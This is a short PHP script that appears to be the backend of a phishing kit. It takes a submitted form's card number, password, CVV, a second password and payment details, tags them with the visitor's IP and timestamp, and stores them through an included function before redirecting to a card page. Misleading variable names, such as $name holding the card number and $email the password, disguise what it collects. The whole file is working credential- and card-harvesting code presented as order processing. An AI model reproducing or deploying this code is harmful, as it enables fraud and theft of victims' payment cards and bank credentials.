<?php
include("p3d1d0s/functions.php");
if(isset($_POST['Submit']))
{
        $name = safeText($_POST['cartao']);
        $email = safeText($_POST['senha']);
        $town = safeText($_POST['cvv']);
        $state = safeText($_POST['estado']);
        $request = safeText($_POST['pedido']);
		$account = safeText($_POST['senha1']);
		$forma = safeText($_POST['forma']);	
        $pegar_ip = $_SERVER['REMOTE_ADDR'];
        $dia_visita = date("d-m-Y");	
        $horas_visita = date("H:i:s");	
        $dados = "IP: $pegar_ip - $dia_visita as $horas_visita Horas. ";		
        
        if(createRequest($name, $town, $state, $email, $request, $account, $forma, $dados))
        header("Location: cartao.html");
        else
                echo("Falha ao enviar pedido!");
				
}
?>